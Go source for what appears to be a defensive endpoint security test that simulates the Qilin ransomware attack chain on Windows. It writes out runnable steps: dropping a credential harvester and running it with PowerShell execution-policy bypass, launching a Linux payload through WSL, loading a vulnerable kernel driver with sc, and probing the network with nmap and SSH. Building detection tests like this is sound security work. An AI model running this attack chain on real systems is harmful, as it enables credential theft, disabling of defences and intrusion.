//go:build windows
// +build windows

/*
ID: e61894bb-7cdf-448b-a2e9-29511125dae4
NAME: Qilin Cross-Platform Evasion Simulation
TECHNIQUE: T1202, T1055, T1574.002, T1003, T1046, T1082
UNIT: response
CREATED: 2025-11-03 00:00:00.000000
*/
package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed wsl_verification.ps1
var wslVerificationScript []byte

//go:embed linux_payload.sh
var linuxPayload []byte

//go:embed credential_harvester.ps1
var credentialHarvester []byte

//go:embed rwdrv.sys
var vulnerableDriver []byte

// Check if WSL is installed and functional
func checkWSLInstallation() (bool, error) {
	cmd := exec.Command("wsl", "--status")
	output, err := cmd.Output()
	if err != nil {
		return false, err
	}

	// Check if WSL is installed and has a distribution
	if strings.Contains(string(output), "Default Version") {
		// Verify we can execute basic commands
		testCmd := exec.Command("wsl", "echo", "test")
		_, err := testCmd.Output()
		return err == nil, nil
	}

	return false, fmt.Errorf("WSL not properly configured")
}

// Install WSL if not present
func installWSL() error {
	Endpoint.Say("WSL not detected, attempting installation...")

	// Enable WSL feature
	cmd := exec.Command("dism.exe", "/online", "/enable-feature", "/featurename:Microsoft-Windows-Subsystem-Linux", "/all", "/norestart")
	err := cmd.Run()
	if err != nil {
		return fmt.Errorf("failed to enable WSL feature: %v", err)
	}

	// Install default Ubuntu distribution
	installCmd := exec.Command("wsl", "--install", "-d", "Ubuntu")
	err = installCmd.Run()
	if err != nil {
		return fmt.Errorf("failed to install WSL distribution: %v", err)
	}

	Endpoint.Say("WSL installation initiated - may require reboot")
	return nil
}

// Execute Linux payload through WSL (Phase 2)
func executeLinuxPayload() error {
	Endpoint.Say("Phase 2: Executing Linux binary via WSL...")

	// Create Linux script in WSL filesystem
	scriptPath := "/tmp/qilin_payload.sh"

	// Write the payload to WSL filesystem
	writeCmd := exec.Command("wsl", "bash", "-c", fmt.Sprintf("cat > %s", scriptPath))
	writeCmd.Stdin = strings.NewReader(string(linuxPayload))
	err := writeCmd.Run()
	if err != nil {
		return fmt.Errorf("failed to write Linux payload: %v", err)
	}

	// Make it executable
	chmodCmd := exec.Command("wsl", "chmod", "+x", scriptPath)
	err = chmodCmd.Run()
	if err != nil {
		return fmt.Errorf("failed to make payload executable: %v", err)
	}

	// Execute the payload
	execCmd := exec.Command("wsl", "bash", scriptPath)
	output, err := execCmd.CombinedOutput()
	if err != nil {
		Endpoint.Say("Linux payload execution blocked: %v", err)
		return err
	}

	Endpoint.Say("Linux payload executed successfully via WSL")
	Endpoint.Say("Output: %s", string(output))
	return nil
}

// Simulate credential harvesting (Phase 3)
func harvestCredentials() error {
	Endpoint.Say("Phase 3: Simulating credential harvesting...")

	targetDir := "c:\\F0"
	scriptPath := filepath.Join(targetDir, "cred_harvest.ps1")

	err := os.WriteFile(scriptPath, credentialHarvester, 0644)
	if err != nil {
		return fmt.Errorf("failed to drop credential harvester: %v", err)
	}

	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		Endpoint.Say("Credential harvesting blocked: %v", err)
		return err
	}

	Endpoint.Say("Credential harvesting simulation completed")
	Endpoint.Say("Harvested data: %s", string(output))
	return nil
}

// BYOVD attack using vulnerable driver (Phase 4)
func byovdAttack() error {
	Endpoint.Say("Phase 4: BYOVD attack with vulnerable driver...")

	targetDir := "c:\\F0"
	driverPath := filepath.Join(targetDir, "rwdrv.sys")

	err := os.WriteFile(driverPath, vulnerableDriver, 0755)
	if err != nil {
		return fmt.Errorf("failed to drop vulnerable driver: %v", err)
	}

	// Attempt to load the driver
	loadCmd := exec.Command("sc", "create", "rwdrv", "binPath=", driverPath, "type=", "kernel")
	err = loadCmd.Run()
	if err != nil {
		Endpoint.Say("Driver loading blocked: %v", err)
		return err
	}

	startCmd := exec.Command("sc", "start", "rwdrv")
	err = startCmd.Run()
	if err != nil {
		Endpoint.Say("Driver start blocked: %v", err)
		return err
	}

	Endpoint.Say("Vulnerable driver loaded successfully")

	// Cleanup
	exec.Command("sc", "stop", "rwdrv").Run()
	exec.Command("sc", "delete", "rwdrv").Run()

	return nil
}

// Simulate lateral movement (Phase 5)
func lateralMovement() error {
	Endpoint.Say("Phase 5: Cross-platform lateral movement simulation...")

	// Simulate network reconnaissance
	reconCmd := exec.Command("wsl", "nmap")
	_, err := reconCmd.CombinedOutput()
	if err != nil {
		Endpoint.Say("Network reconnaissance blocked: %v", err)
		return err
	}

	Endpoint.Say("Network reconnaissance completed")

	// Simulate SSH connection attempts
	// Revision: This is a simulation; actual connections may fail
	// *********************************************************
	sshCmd := exec.Command("wsl", "ssh", "-o", "ConnectTimeout=5", "-o", "PasswordAuthentication=yes", "admin@192.168.1.1")
	sshCmd.Run() // Expected to fail, but simulates the attempt

	Endpoint.Say("Lateral movement simulation completed")
	return nil
}

func executeQilinSimulation() error {
	targetDir := "c:\\F0"
	os.MkdirAll(targetDir, 0755)

	// Phase 1: WSL Verification and Installation
	Endpoint.Say("Phase 1: WSL verification and setup...")
	wslInstalled, err := checkWSLInstallation()
	if err != nil || !wslInstalled {
		Endpoint.Say("WSL not available, attempting installation...")

		// Drop WSL verification script
		scriptPath := filepath.Join(targetDir, "wsl_verification.ps1")
		err := os.WriteFile(scriptPath, wslVerificationScript, 0644)
		if err != nil {
			return fmt.Errorf("failed to drop WSL script: %v", err)
		}

		// Execute WSL verification/installation script
		cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
		output, err := cmd.CombinedOutput()
		if err != nil {
			Endpoint.Say("WSL installation blocked: %v", err)
			return fmt.Errorf("WSL installation failed")
		}

		Endpoint.Say("WSL setup completed: %s", string(output))

		// Recheck WSL status
		wslInstalled, err = checkWSLInstallation()
		if err != nil || !wslInstalled {
			return fmt.Errorf("WSL still not available after installation")
		}
	}

	Endpoint.Say("WSL verification successful, proceeding with cross-platform attack...")

	// Execute attack phases
	phases := []struct {
		name string
		fn   func() error
	}{
		{"Linux Payload Execution", executeLinuxPayload},
		{"Credential Harvesting", harvestCredentials},
		{"BYOVD Attack", byovdAttack},
		{"Lateral Movement", lateralMovement},
	}

	completedPhases := 0
	for _, phase := range phases {
		Endpoint.Say("Executing %s...", phase.name)
		err := phase.fn()
		if err != nil {
			Endpoint.Say("Phase failed: %s - %v", phase.name, err)
			break
		}
		completedPhases++
		Endpoint.Say("Phase completed: %s", phase.name)
		time.Sleep(2 * time.Second)
	}

	if completedPhases == len(phases) {
		Endpoint.Say("SUCCESS: All Qilin cross-platform attack phases completed")
		Endpoint.Say("System is vulnerable to cross-platform evasion techniques")
		return nil
	}

	return fmt.Errorf("attack stopped after %d/%d phases", completedPhases, len(phases))
}

func test() {
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("Dropper initialization failed: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Starting Qilin Cross-Platform Evasion Simulation")
	Endpoint.Say("This test simulates Qilin's technique of using Linux binaries on Windows")
	Endpoint.Say("Attack vector: WSL abuse for cross-platform evasion")
	Endpoint.Say("Expected behaviors: WSL usage, driver loading, credential harvesting")
	Endpoint.Wait(2)

	// Check if components get quarantined
	if Endpoint.Quarantined("wsl_verification.ps1", wslVerificationScript) {
		Endpoint.Say("WSL verification script was quarantined!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	if Endpoint.Quarantined("linux_payload.sh", linuxPayload) {
		Endpoint.Say("Linux payload was quarantined!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	if Endpoint.Quarantined("credential_harvester.ps1", credentialHarvester) {
		Endpoint.Say("Credential harvester was quarantined!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	if Endpoint.Quarantined("rwdrv.sys", vulnerableDriver) {
		Endpoint.Say("Vulnerable driver was quarantined!")
		Endpoint.Stop(Endpoint.FileQuarantinedOnExtraction)
	}

	Endpoint.Say("Components not quarantined, executing Qilin simulation...")

	// Execute the cross-platform attack simulation
	err := executeQilinSimulation()
	if err != nil {
		Endpoint.Say("Qilin simulation blocked: %v", err)
		Endpoint.Stop(Endpoint.ExecutionPrevented)
	}

	Endpoint.Say("Qilin cross-platform evasion was not prevented")
	Endpoint.Say("System vulnerable to Linux binary execution via WSL")
	Endpoint.Stop(Endpoint.Unprotected)
}

func main() {
	Endpoint.Say("Qilin Cross-Platform Evasion Test")
	Endpoint.Say("Test ID: e61894bb-7cdf-448b-a2e9-29511125dae4")
	Endpoint.Say("Starting at: %s", time.Now().Format("2006-01-02T15:04:05"))

	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	select {
	case <-done:
		Endpoint.Say("Test completed within timeout window")
	case <-time.After(5 * time.Minute):
		Endpoint.Say("Test timed out after 5 minutes")
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
